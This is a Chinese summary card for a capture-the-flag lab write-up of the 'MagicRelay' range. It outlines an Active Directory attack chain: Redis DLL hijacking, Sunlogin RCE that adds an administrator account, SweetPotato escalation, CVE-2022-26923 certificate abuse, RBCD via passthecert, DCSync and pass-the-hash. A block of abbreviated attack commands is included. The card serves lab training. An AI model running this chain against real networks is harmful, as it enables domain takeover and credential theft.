---
title: "春秋云境MagicRelay WP"
category: web
tags: ["春秋云境靶场", "web", "Redis DLL劫持", "向日葵RCE", "SweetPotato提权", "CVE-2022-26923"]
signals: ["春秋云境靶场 2022", "Redis DLL劫持", "向日葵RCE", "SweetPotato提权", "CVE-2022-26923", "ADCS", "passthecert", "RBCD攻击", "哈希传递", "auth_bypass", "MagicRelay", "Redis", "DLL", "RCE"]
difficulty: hard
source: "https://www.ctfiot.com/230509.html"
tools: ["C", "Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 春秋云境MagicRelay WP

> 赛事：春秋云境靶场 2022 | 方向：web | 难度：hard | 工具：C、Python

## 一句话总结

春秋云境MagicRelay：Redis DLL劫持+向日葵RCE+AD CS域提权(CVE-2022-26923)+RBCD全链路

## 攻击链

1. Redis未授权dll劫持上线CS马(flag1)→内网扫描→向日葵RCE加管理员账号(flag2)→SweetPotato提权→certify收集AD CS信息→CVE-2022-26923域提权→passthecert打RBCD→申请CIFS票据impersonate Administrator(flag4)→DCSync导出域管哈希→PTH到WIN-AUTHORITY读flag3

## 关键 payload

```
python3 RedisWriteFile.py --rhost ...;sunRce.exe -h ... -t rce -c 'type C:\flag02.txt';certipy account create -u WIN-YUYAOX9Q$ -hashes ...;passthecert.py -action write_rbcd ...;impacket-getST xiaorang.lab/'simho$' -spn cifs/WIN-SERVER
```

## 经验教训

域内AD CS证书服务+机器账户+passthecert可实现无域管密码登录域控

## 标签

Redis DLL劫持、向日葵RCE、SweetPotato提权、CVE-2022-26923、ADCS、passthecert、RBCD攻击、哈希传递

## 参考来源

- https://www.ctfiot.com/230509.html
- 原文件：春秋云境MagicRelay_WP.full.md
